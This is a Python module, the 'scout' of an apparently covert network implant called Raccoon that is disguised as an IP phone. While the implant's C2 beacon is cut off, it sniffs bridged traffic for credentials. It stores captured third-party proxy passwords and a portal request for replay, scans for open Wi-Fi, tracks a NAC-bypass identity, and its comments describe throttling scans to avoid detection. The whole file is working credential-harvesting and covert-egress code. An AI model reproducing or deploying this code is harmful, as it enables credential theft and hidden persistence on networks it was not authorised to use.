#!/usr/bin/env python3
"""The scout: watch the tapped port while the beacon is stuck, and publish.

This is the dependency-heavy half of the way out, and it is a separate
process for a reason that is written into `beacon.py`: that file is served
to a target as source text and may import only the standard library, so
scapy, PyYAML and a model client cannot live there. The two halves meet
over files -- see `handoff.py`.

**Quiet on a healthy implant.** Nothing here captures, scans or publishes
until the beacon's state file says a stuck window is open. A second
promiscuous reader on a device whose whole budget is about 13 W, and which
is already bridging and capturing, is a cost; it is paid only while there
is something to pay it for. `wanted()` is the question the loop asks.

**Its own narrow capture, not the sniffer's pcaps.** Reading those would
make the evidence path depend on `sniffer.encrypt_captures`, an operator's
storage choice; and calling into `BridgeTap` would couple the C2 half to
the sniffer that `beacon.py` deliberately does not import. So it runs one
`scapy.sniff` with `evidence.BPF_FILTER` -- five protocols, each a row of
the design's evidence table.

**Two documents out, and the split is the point.** `way_out_scout.json` is
the handoff the beacon reads every stuck cycle: counts, names and flags,
no secret. `way_out_borrow.json` is 0600 and holds the credentials
themselves and the portal request to replay; only a borrow verb opens it.
A handoff carrying passwords would be a second place they can be found on
a device built to look like an IP phone.

**The trail is not the scout's.** It was, and a review moved it: the
beacon records its attempts into the one file it writes, that file is
removed when a leg delivers, and this process copied the new lines onto
an append-only trail on its own publishing clock -- which lost every
attempt made in a window's last interval and duplicated the rest on a
restart. `Beacon._way_out_record_attempt` appends the line itself now.
The section "the trail is not here" below has the whole reasoning.

**Nothing here raises.** It runs unattended on a device nobody can reach.
"""

import argparse
import logging
import os
import re
import subprocess
import sys
import time
from typing import List, Optional

from . import handoff
from .evidence import BPF_FILTER, Evidence

logger = logging.getLogger("raccoon.scout")

_SYSFS_NET = "/sys/class/net"
# How long a scan and the capture slice are given. Short, because this runs
# on a device that is bridging at the same time.
_SCAN_TIMEOUT = 20
_CAPTURE_SLICE = 15
# How often the radio may be scanned, at the most. A scan is a command and
# a burst of probe requests, and a device shaped like an IP phone that
# scans for wireless networks four times a minute for ever is its own
# detection signature. Raised to the publishing interval when `run` starts.
_SCAN_EVERY = 300
# How long after the beacon last wrote its window this process still
# believes it. Generous, because a stuck window is the case this exists
# for and the beacon rewrites the file every cycle: at the shipped 300 s
# interval that is twelve missed cycles.
_WINDOW_STALE_AFTER = 3600


def _parse_scan(output: str) -> List[dict]:
    """`iw scan`'s output as `[{"ssid", "open"}]`, in the order seen.

    Parsed from the tool's own text rather than through a library: the two
    facts needed are the name and whether the capability line says
    Privacy, and a dependency for that would be a package to install on a
    device nobody can reach.

    **Per `BSS ` block, and not line-pairwise.** `capability:` is a fixed
    BSS field and comes *before* `SSID:`, which is an information element
    printed after it. A reader that emitted on the capability line took
    each network's privacy bit from the block above it and dropped the last
    network entirely -- and it passed a hand-written fixture in the wrong
    order until a review read real output. So each block is collected and
    emitted when the next one starts.

    A block with no capability line is **not** guessed at: half a scan is
    an interface that went down mid-scan, and "probably open" would spend
    rung 3's attempt on a network that may not be joinable. A block with an
    empty SSID is a hidden network, which `iw connect` has nothing to be
    given. The same name on two bands is one candidate.
    """
    found = []
    seen = set()
    ssid = capability = None

    def emit():
        if ssid and capability is not None and ssid not in seen:
            seen.add(ssid)
            found.append({"ssid": ssid, "open": "Privacy" not in capability})

    for line in output.splitlines():
        stripped = line.strip()
        if line.startswith("BSS "):
            emit()
            ssid = capability = None
        elif stripped.startswith("capability:"):
            capability = stripped
        elif stripped.startswith("SSID:"):
            ssid = stripped[5:].strip()
    emit()
    return found


def _block(config, *keys) -> dict:
    """A nested mapping out of the config, or an empty one.

    `(x or {}).get(...)` guards `None` and `[]` and **not a scalar**, and
    a review found three raises reachable from one config typo --
    `nac_bypass: enabled` instead of `nac_bypass: {enabled: true}`. The
    unit is `Restart=on-failure` with a burst limit, so five of those in
    five minutes and systemd stops trying, on a device nobody can reach.
    """
    found = config
    for key in keys:
        if not isinstance(found, dict):
            return {}
        found = found.get(key)
    return found if isinstance(found, dict) else {}


class Scout(object):
    """One stuck window's evidence, and the document that carries it."""

    def __init__(self, config: dict, state_dir: str):
        self.config = config if isinstance(config, dict) else {}
        self.state_dir = state_dir
        network = _block(self.config, "network")
        self.bridge = network.get("bridge_name") or "br0"
        # The port the host is on, which is what makes "from the host" a
        # wire fact rather than a guess about a frame. `configs/raccoon.yaml`
        # names it, because the bridge is built from it.
        self.downstream = network.get("downstream_iface") or "eth1"
        # When the radio was last scanned, and what it saw. The scan is a
        # command per publish otherwise, and a device shaped like an IP
        # phone scanning for wireless networks four times a minute for
        # ever is its own signature. One scan per publishing interval.
        self._scanned_at = 0.0
        self._ssids = []            # type: List[dict]
        self._scan_interval = float(_SCAN_EVERY)
        self.evidence = Evidence(own_mac=self._own_mac(),
                                 host_macs=self._host_macs())
        self._running = True

    # ── the question the loop asks ──

    def wanted(self) -> bool:
        """Whether there is a stuck window to collect evidence for.

        **And whether the beacon is still writing it.** The window file is
        removed when a leg delivers and at no other time -- not on a
        `kill`, a crash, an OOM kill or a `systemctl stop` -- so without
        the age check below a dead beacon left this process capturing and
        scanning the radio for ever, which is the detection signature
        `docs/WAY_OUT.md` spends a paragraph on. The beacon's own
        fresh-or-ignore rule protects it from a dead scout; this is the
        same rule in the other direction.

        A window with no `touched` stamp is a beacon older than that
        field, and is believed: reading it as dead would turn an upgrade
        into a scout that never starts.
        """
        state = handoff.read_state(self.state_dir)
        if state is None:
            return False
        touched = state.get("touched")
        if not isinstance(touched, (int, float)) or isinstance(touched, bool):
            return True
        return abs(time.time() - float(touched)) <= _WINDOW_STALE_AFTER

    def observe(self, packet) -> None:
        """One captured frame. Raises nothing, whatever it is."""
        self.evidence.observe(packet)

    def stop(self) -> None:
        self._running = False

    # ── publishing ──

    def publish_once(self) -> Optional[dict]:
        """Publish one document, or None while the beacon is not stuck.

        Never raises. A directory that cannot be written costs one warning
        and the beacon degrades to its policy, which is the property that
        makes a dead scout harmless.
        """
        try:
            return self._publish_once()
        except Exception as exc:
            # The stance `Evidence.observe` already takes, for the same
            # reason one step further out: this process is the only thing
            # that could explain the rescue afterwards, and its unit stops
            # retrying after five failures.
            logger.warning("scout: nothing was published this round (%s); "
                           "the beacon decides on its policy alone", exc)
            return None

    def _publish_once(self) -> Optional[dict]:
        if not self.wanted():
            # `wanted` and not `read_state`: a window the beacon has
            # stopped writing is a window nobody will read a document
            # for, and publishing one would keep a dead deployment's last
            # evidence looking current.
            return None
        state = handoff.read_state(self.state_dir)
        if state is None:
            return None
        # The bridge may have learned a new device, or aged one out, since
        # the last publish.
        self.refresh_identity()
        # Computed once and handed to both: the scan costs a radio command,
        # and the model is asked about the same reading the beacon is given.
        tap = self._tap_fields()
        document = {
            "version": handoff.DOCUMENT_VERSION,
            "published": time.time(),
            # Copied through unchanged. The beacon matches a recommendation
            # against the evidence it was made for, so a scout that
            # rewrote this would make every recommendation look stale.
            "evidence": state.get("evidence"),
            "tap": tap,
            "identity_pre_spent": self._identity_spent(),
            "recommendation": self._recommendation(state, tap),
        }
        try:
            handoff.write_document(self.state_dir, document)
            handoff.write_borrow(self.state_dir,
                                 self.evidence.as_borrow_fields())
        except (OSError, ValueError) as exc:
            logger.warning(
                "scout: nothing could be published to %s (%s), so the beacon "
                "will decide on its policy alone", self.state_dir, exc)
            return None
        return document

    def _tap_fields(self) -> dict:
        fields = self.evidence.as_document_fields()
        fields["ssids"] = self._ssids_now()
        return fields

    def _ssids_now(self) -> List[dict]:
        """What the radio saw, scanned at most once per interval."""
        now = time.time()
        if self._scanned_at and now - self._scanned_at < self._scan_interval:
            return list(self._ssids)
        self._scanned_at = now
        self._ssids = self._scan_ssids()
        return list(self._ssids)

    def _identity_spent(self) -> bool:
        """Whether rung 4 is already spent, which only this side can know.

        Two ways, and both are true statements about the same thing: the
        operator set `nac_bypass.enabled`, so the identity was taken at
        boot; or a request was made and taken in an earlier window.
        """
        if _block(self.config, "nac_bypass").get("enabled"):
            return True
        request = handoff.read_document_at(
            handoff.identity_path(self.state_dir), handoff.STATE_VERSION)
        return bool(request and request.get("taken"))

    def _recommendation(self, state: dict, tap: dict) -> Optional[dict]:
        """The model's answer, or None. Off unless configured on.

        Stage 4 of this work, and it ships off: without a device nobody
        can say what inference costs on PoE, so the first operator to
        switch it on is the first measurement.
        """
        model = self._model_block()
        if not model.get("enabled"):
            return None
        from .model import ask
        return ask(model, state, tap)

    def _model_block(self) -> dict:
        return _block(self.config, "c2", "way_out", "model")

    # ── the trail is not here ──
    #
    # It was: the beacon recorded each attempt into the window's own file
    # and this copied new lines onto an append-only trail on the
    # publishing clock. That lost every attempt made in the last interval
    # of a window -- a leg delivering removes the window's file, and on a
    # recovered implant the lost line is the attempt that worked -- and
    # duplicated what it had already copied whenever this unit restarted.
    # `Beacon._way_out_record_attempt` writes the trail now, in the same
    # call that records the attempt.

    # ── the radio ──

    def _run(self, argv: List[str], timeout: int = _SCAN_TIMEOUT):
        """One command, as `(returncode, output)`. Never raises."""
        try:
            done = subprocess.run(argv, capture_output=True, text=True,
                                  timeout=timeout)
        except (OSError, subprocess.SubprocessError) as exc:
            return 1, str(exc)
        return done.returncode, (done.stdout or "") + (done.stderr or "")

    def refresh_identity(self) -> None:
        """Re-read which MACs the bridge has on the downstream port.

        Per publish, because the bridge learns and ages entries while the
        implant is dark and a reading taken once at construction would go
        stale over a window the design's worst case puts at a week.
        """
        self.evidence.host_macs = self.evidence.__class__(
            host_macs=self._host_macs()).host_macs

    def _host_macs(self) -> Optional[List[str]]:
        """The MACs the bridge learned on the downstream port, or None.

        `None` and not `[]`: an empty list would mean "the host is nobody"
        and the scout would collect nothing at all, which is worse on a
        host whose bridge cannot be read than an anchor that can be lied
        to. `Evidence` says which it has.

        Group and broadcast addresses are skipped -- they are `self
        permanent` entries the bridge keeps for its own multicast
        handling, not a device behind the port. One check, not two: the
        broadcast address has the group bit set, so a second test for it
        by name would be a branch no input can reach.
        """
        code, output = self._run(["bridge", "fdb", "show", "br",
                                  self.bridge, "dev", self.downstream])
        if code != 0:
            logger.debug("scout: the bridge's forwarding table could not be "
                         "read (%s), so the host side is whoever speaks "
                         "first", output.strip()[:200])
            return None
        found = []
        for line in output.splitlines():
            parts = line.split()
            if not parts:
                continue
            mac = parts[0].strip().lower()
            if len(mac.split(":")) != 6:
                continue
            try:
                if int(mac.split(":", 1)[0], 16) & 0x01:
                    continue            # a group address, broadcast included
            except ValueError:
                continue
            if mac not in found:
                found.append(mac)
        return found or None

    def _own_mac(self) -> Optional[str]:
        """The bridge's own address, so the implant is not read as the host.

        Read once from sysfs, and None when it cannot be: a scout that
        refused to collect because it could not find its own MAC would be
        worse than one that occasionally reads its own traffic.
        """
        try:
            with open(os.path.join(_SYSFS_NET, self.bridge,
                                   "address")) as handle:
                return handle.read().strip().lower() or None
        except OSError:
            return None

    def _radio_iface(self) -> Optional[str]:
        """The first wireless interface, or None.

        The USB question belongs to the rung that *associates*, not to the
        scan: knowing which networks are in range costs nothing either way,
        and `Beacon._radio_iface` is where the 13 W budget refuses an
        adapter.
        """
        try:
            names = sorted(os.listdir(_SYSFS_NET))
        except OSError:
            return None
        for name in names:
            if os.path.exists(os.path.join(_SYSFS_NET, name, "wireless")):
                return name
        return None

    def _scan_ssids(self) -> List[dict]:
        """What the radio can see, and which of it is open. Never raises."""
        iface = self._radio_iface()
        if iface is None:
            return []
        code, output = self._run(["iw", "dev", iface, "scan"])
        if code != 0:
            logger.debug("scout: the radio scan on %s failed: %s", iface,
                         output.strip()[:200])
            return []
        return _parse_scan(output)

    # ── the capture ──

    def capture_slice(self, seconds: int = _CAPTURE_SLICE) -> None:
        """Sniff the bridge for a few seconds. Never raises.

        Its own narrow capture with `BPF_FILTER`, not the sniffer's pcaps
        and not a callback into `BridgeTap`: see the module docstring.
        """
        from scapy.all import sniff
        try:
            sniff(iface=self.bridge, filter=BPF_FILTER, store=False,
                  prn=self.observe, timeout=seconds,
                  stop_filter=lambda _packet: not self._running)
        except Exception as exc:
            logger.warning("scout: the capture on %s stopped: %s",
                           self.bridge, exc)

    def run(self, interval: float) -> None:
        """Collect and publish for as long as the beacon is stuck.

        The loop sleeps while the implant is healthy, so the cost of this
        process on an implant that never loses its channel is one
        `read_state` per interval.
        """
        self._scan_interval = max(float(interval), float(_SCAN_EVERY))
        while self._running:
            if self.wanted():
                self.capture_slice()
                self.publish_once()
                # On a clock, and that is the cost control. Without this
                # the loop captured continuously and scanned the radio
                # every capture slice, for as long as the outage lasted --
                # on a device whose whole budget is about 13 W and which
                # is already bridging. The slice already spent part of the
                # interval, so only the rest is waited out.
                self._sleep(max(1.0, interval - _CAPTURE_SLICE))
            else:
                # A window that closed is a window whose evidence is spent:
                # the next one starts from nothing, or a failure from three
                # outages ago would drive a decision today.
                self.evidence = Evidence(own_mac=self._own_mac(),
                                         host_macs=self._host_macs())
                # And the borrow file goes with it, because it is the one
                # file in this handoff that carries a **secret**: a third
                # party's proxy password, taken off the wire. The beacon
                # removes its own window when a leg delivers and then
                # stops writing, so nothing else here would ever have
                # removed this -- a captured password sat on the disk of a
                # device built to look like an IP phone until somebody
                # reimaged it. Removed rather than overwritten empty, so
                # there is no file to find at all. Raises nothing.
                handoff.remove(handoff.borrow_path(self.state_dir))
                self._sleep(min(interval, 30))

    def _sleep(self, seconds: float) -> None:
        """The one place this process waits, so a test can stand in for it."""
        time.sleep(seconds)


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description="The Raccoon implant's way-out scout")
    parser.add_argument("-c", "--config", help="Path to raccoon.yaml")
    args = parser.parse_args(argv)

    import yaml
    from software.c2.beacon import read_way_out_policy

    paths = [args.config, "/opt/raccoon/configs/raccoon.yaml",
             os.path.join(os.path.dirname(__file__), "..", "..", "configs",
                          "raccoon.yaml")]
    config = None
    for path in paths:
        if path and os.path.exists(path):
            with open(path) as handle:
                config = yaml.safe_load(handle) or {}
            break
    if config is None:
        print("No config file found", file=sys.stderr)
        return 1

    policy = read_way_out_policy((config.get("c2") or {}).get("way_out"))
    if not policy["enabled"] or not policy["state_dir"]:
        # Not an error. The scout ships with the feature off, and a unit
        # that exited 1 would restart for ever on a drop box that simply
        # does not want it.
        print("c2.way_out is off: the scout has nothing to do",
              file=sys.stderr)
        return 0

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [scout] %(levelname)s %(message)s")
    scout = Scout(config, policy["state_dir"])
    # Half the freshness window, so a published document is never stale by
    # the time the beacon's next cycle reads it.
    scout.run(max(1.0, policy["document_max_age_seconds"] / 2.0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
